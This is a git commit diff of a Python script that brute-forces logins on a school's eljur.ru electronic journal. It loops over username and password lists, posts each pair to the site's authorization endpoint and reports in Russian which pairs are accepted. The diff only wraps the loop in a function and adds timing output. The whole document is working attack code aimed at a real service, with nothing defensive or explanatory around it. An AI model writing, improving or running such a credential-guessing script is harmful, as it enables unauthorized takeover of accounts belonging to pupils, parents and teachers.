726df6d1ed76c6ad34c9123e4eb28bfb98358eea
DAAMCS <79829868+DAAMCS@users.noreply.github.com>
2022-12-06 10:34:54 +0700

    1.0.1

--- main.py
+++ main.py
@@ -6,22 +6,22 @@ from colorama import init
 from colorama import Fore, Back, Style
 import time
 
-
-print()
 init()
-schooldomain = input('Введите домен вашей школы. (символы перед .eljure.ru, Например - soch152: ')
-for i in paswords:
-    for x in usernames:
-        start_time = time.time()
-        params= {
-            'username':x,
-            'password':i
-        }
+def solve(schooldomain):
+    for i in paswords:
+        for x in usernames:
+            start_time = time.time()
+            params= {
+                'username':x,
+                'password':i
+            }
+            req = post(f'https://{schooldomain}.eljur.ru/ajaxauthorize', params=params)
+            answ = req.json()['result']
+            if answ is False:
+                print(Fore.RED + f'Пробую - {x}:{i} | Ошибка | {round((time.time() - start_time)*1000)}ms')
+            else:
+                print(Fore.GREEN + f'Пробую - {x}:{i} | Данные верны | {round((time.time() - start_time)*1000)}, 5)ms')
 
-        req = post(f'https://{schooldomain}.eljur.ru/ajaxauthorize', params=params)
-
-        answ = req.json()['result']
-        if answ is False:
-            print(Fore.RED + f'Пробую {x}:{i} | Ошибка')
-        else:
-            print(Fore.GREEN + f'Пробую {x}:{i} | Данные верны')
+if __name__ == "__main__":
+    schooldomain = input('Введите домен вашей школы. (символы перед .eljure.ru, Например - soch152: ')
+    solve(schooldomain)
